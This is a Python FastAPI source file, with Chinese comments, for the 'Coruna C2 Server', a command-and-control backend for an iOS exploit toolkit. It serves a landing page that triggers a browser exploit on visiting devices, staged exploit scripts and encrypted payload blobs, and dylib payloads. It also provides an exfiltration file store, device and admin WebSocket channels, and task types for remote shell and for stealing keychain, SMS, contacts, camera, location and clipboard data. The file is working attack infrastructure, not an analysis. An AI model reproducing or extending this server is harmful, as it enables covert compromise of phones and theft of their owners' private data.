"""FastAPI 主应用"""

from fastapi import FastAPI, Request, Depends, WebSocket
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
from contextlib import asynccontextmanager
import os, asyncio
from pathlib import Path

from database import engine, Base
from config import get_config
from api import devices, tasks, upload, postexploit, admin, websocket, payloads, debug, collect as collect_api
from api.websocket import sse_manager

config = get_config()


@asynccontextmanager
async def lifespan(app: FastAPI):
    """应用生命周期管理"""
    # 启动时创建数据库表
    Base.metadata.create_all(bind=engine)
    
    # 创建必要的目录
    config.EXFIL_DIR.mkdir(parents=True, exist_ok=True)
    config.LOG_DIR.mkdir(parents=True, exist_ok=True)
    config.PAYLOADS_DIR.mkdir(parents=True, exist_ok=True)
    
    print("[OK] Database initialized")
    print("[OK] Directories created")
    print(f"[OK] Server running on: http://{config.HOST}:{config.PORT}")
    
    yield
    
    # 关闭时清理
    print("Shutting down...")


# 创建 FastAPI 应用
app = FastAPI(
    title="Coruna C2 Server",
    description="Command and Control server for iOS exploit toolkit",
    version="1.0.0",
    lifespan=lifespan
)

# CORS 中间件
app.add_middleware(
    CORSMiddleware,
    allow_origins=config.CORS_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# 禁止缓存中间件 — 确保设备每次获取最新代码
@app.middleware("http")
async def no_cache_middleware(request: Request, call_next):
    response = await call_next(request)
    path = request.url.path
    if path.endswith(".js") or path.endswith(".html") or path == "/":
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        response.headers["Pragma"] = "no-cache"
        response.headers["Expires"] = "0"
    return response


# ==================== 路由注册 ====================

# API 路由
app.include_router(devices.router)
app.include_router(tasks.router)
app.include_router(upload.router)
app.include_router(postexploit.router)
app.include_router(admin.router)
app.include_router(payloads.router)
app.include_router(debug.router)

# 数据收集路由
app.include_router(collect_api.router)

# WebSocket 路由
@app.websocket("/ws/device/{device_uuid}")
async def websocket_device_endpoint(websocket: WebSocket, device_uuid: str):
    """设备 WebSocket 连接端点"""
    from api.websocket import websocket_endpoint
    await websocket_endpoint(websocket, device_uuid=device_uuid, admin=False)


@app.websocket("/ws/admin")
async def websocket_admin_endpoint(websocket: WebSocket):
    """管理员 WebSocket 连接端点"""
    from api.websocket import websocket_endpoint
    await websocket_endpoint(websocket, admin=True)


# ==================== 静态文件服务 ====================

# 获取项目根目录
project_root = Path(__file__).parent.parent

# 挂载静态文件目录（用于提供管理面板资源）
static_dir = project_root / "frontend" / "static"
if static_dir.exists():
    app.mount("/static", StaticFiles(directory=str(static_dir)), name="static")

# 挂载外泄文件目录
if config.EXFIL_DIR.exists():
    app.mount("/exfil", StaticFiles(directory=str(config.EXFIL_DIR)), name="exfil")

# 挂载 downloaded 目录（用于提供 .min.js 漏洞利用文件）
downloaded_dir = project_root / "downloaded"
if downloaded_dir.exists():
    app.mount("/downloaded", StaticFiles(directory=str(downloaded_dir)), name="downloaded")

# 挂载 payloads 目录（用于提供 dylib/bin 文件）
payloads_dir = project_root / "payloads"
if payloads_dir.exists():
    app.mount("/payloads", StaticFiles(directory=str(payloads_dir)), name="payloads")


# ==================== 根路径和健康检查 ====================

@app.get("/", response_class=HTMLResponse)
async def root():
    """根路径 - 返回管理面板"""
    admin_html = project_root / "frontend" / "admin.html"
    if admin_html.exists():
        with open(admin_html, "r", encoding="utf-8") as f:
            return f.read()
    
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Coruna C2 Server</title>
        <meta charset="utf-8">
    </head>
    <body>
        <h1>Coruna C2 Server</h1>
        <p>Server is running. API documentation available at <a href="/docs">/docs</a></p>
        <p>WebSocket endpoints:</p>
        <ul>
            <li>Device: ws://host:port/ws/device/{device_uuid}</li>
            <li>Admin: ws://host:port/ws/admin</li>
        </ul>
    </body>
    </html>
    """


@app.get("/debug", response_class=HTMLResponse)
async def debug_page():
    """调试面板"""
    debug_html = project_root / "frontend" / "debug.html"
    if debug_html.exists():
        with open(debug_html, "r", encoding="utf-8") as f:
            return f.read()
    return HTMLResponse(content="<h1>debug.html not found</h1>", status_code=404)


@app.get("/group.html", response_class=HTMLResponse)
async def group_page():
    """攻击入口页面 - iOS设备访问此页面触发漏洞"""
    group_html = project_root / "group.html"
    if group_html.exists():
        with open(group_html, "r", encoding="utf-8") as f:
            content = f.read()
        return HTMLResponse(
            content=content,
            headers={
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0",
            },
        )
    return HTMLResponse(content="<h1>group.html not found</h1>", status_code=404)


@app.get("/platform_module.js")
async def platform_module_js():
    """平台模块 JS"""
    module_file = project_root / "platform_module.js"
    if module_file.exists():
        with open(module_file, "r", encoding="utf-8") as f:
            content = f.read()
        from fastapi.responses import Response
        return Response(content=content, media_type="application/javascript")
    return Response(content="// Not found", status_code=404)


@app.get("/utility_module.js")
async def utility_module_js():
    """工具模块 JS"""
    module_file = project_root / "utility_module.js"
    if module_file.exists():
        with open(module_file, "r", encoding="utf-8") as f:
            content = f.read()
        from fastapi.responses import Response
        return Response(content=content, media_type="application/javascript")
    return Response(content="// Not found", status_code=404)


@app.get("/real_bridge.js")
async def real_bridge_js():
    """独立 dylib 回传桥（不走任务链）"""
    module_file = project_root / "data_collector" / "real_bridge.js"
    if module_file.exists():
        with open(module_file, "r", encoding="utf-8") as f:
            content = f.read()
        from fastapi.responses import Response
        return Response(content=content, media_type="application/javascript")
    from fastapi.responses import Response
    return Response(content="// real_bridge.js not found", status_code=404)


@app.get("/monitor.html", response_class=HTMLResponse)
async def monitor_page():
    """实时监视器页面"""
    monitor_html = project_root / "frontend" / "monitor.html"
    if monitor_html.exists():
        with open(monitor_html, "r", encoding="utf-8") as f:
            return f.read()
    return HTMLResponse(content="<h1>monitor.html not found</h1>", status_code=404)


@app.get("/api/events")
async def sse_endpoint(request: Request):
    """SSE 实时事件流 - 推送设备接入/数据收集事件"""
    from fastapi.responses import StreamingResponse

    client_id = sse_manager.subscribe()

    async def event_stream():
        try:
            while True:
                if await request.is_disconnected():
                    break
                msg = await asyncio.wait_for(sse_manager.read(client_id), timeout=30)
                if msg:
                    yield msg
        except (asyncio.TimeoutError, asyncio.CancelledError):
            pass
        finally:
            sse_manager.unsubscribe(client_id)

    return StreamingResponse(
        event_stream(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
        }
    )


@app.get("/probe/ip")
async def probe_ip(request: Request):
    """封闭环境取客户端 IP（替代外网 ipify）"""
    ip = request.headers.get("X-Forwarded-For", request.client.host if request.client else "127.0.0.1")
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    from fastapi.responses import PlainTextResponse
    return PlainTextResponse(content=(ip or "127.0.0.1") + "\n")


@app.get("/health")
async def health_check():
    """健康检查端点"""
    return {
        "status": "healthy",
        "server": "Coruna C2",
        "version": "1.0.0"
    }


@app.get("/api/info")
async def server_info():
    """服务器信息"""
    return {
        "server": "Coruna C2 Server",
        "version": "1.0.0",
        "supported_ios_versions": config.SUPPORTED_IOS_VERSIONS,
        "exploit_stages": config.EXPLOIT_STAGES,
        "task_types": [
            "shell", "upload", "download", "screenshot", 
            "keychain", "contact", "sms", "camera", "location",
            "app_list", "process_list", "wifi_scan", "clipboard"
        ]
    }


# ==================== 错误处理 ====================

from fastapi import HTTPException
from fastapi.responses import JSONResponse


@app.exception_handler(HTTPException)
async def http_exception_handler(request: Request, exc: HTTPException):
    """HTTP 异常处理"""
    return JSONResponse(
        status_code=exc.status_code,
        content={
            "error": True,
            "message": exc.detail,
            "status_code": exc.status_code
        }
    )


@app.exception_handler(Exception)
async def general_exception_handler(request: Request, exc: Exception):
    """通用异常处理"""
    import traceback
    print(f"Unhandled exception: {exc}")
    print(traceback.format_exc())
    
    return JSONResponse(
        status_code=500,
        content={
            "error": True,
            "message": "Internal server error",
            "detail": str(exc)
        }
    )


# Stage1/Stage2/Stage3 + hash.min.js 路由（必须在所有具体路由之后）
import re
from fastapi.responses import FileResponse, JSONResponse

stage_pattern = re.compile(r'^Stage\d.*\.js$')
hash_min_pattern = re.compile(r'^([a-f0-9]{40})\.min\.js$', re.I)


@app.get("/{stage_file:path}")
async def serve_stage_files(stage_file: str):
    """提供 Stage*.js 与 /{hash}.min.js（manifest / 加密载荷）"""
    # 1) Stage1/2/3 脚本
    if stage_pattern.match(stage_file):
        js_file = project_root / stage_file
        if js_file.exists():
            return FileResponse(str(js_file), media_type="application/javascript")

    # 2) /{hash}.min.js → downloaded/ 或 payloads/{hash}/raw.bin
    m = hash_min_pattern.match(stage_file)
    if m:
        h = m.group(1).lower()
        candidates = [
            project_root / "downloaded" / f"{h}.min.js",
            project_root / "payloads" / h / "raw.bin",
            project_root / "other" / f"{h}.js",
            project_root / "other" / f"{h}.min.js",
        ]
        for cand in candidates:
            if cand.exists() and cand.is_file():
                # 原始加密 blob / F00DBEEF，按 octet-stream 返回即可
                return FileResponse(str(cand), media_type="application/octet-stream")

    return JSONResponse(status_code=404, content={"detail": "Not found", "path": stage_file})



if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        "backend.main:app",
        host=config.HOST,
        port=config.PORT,
        reload=True,
        log_level="info"
    )
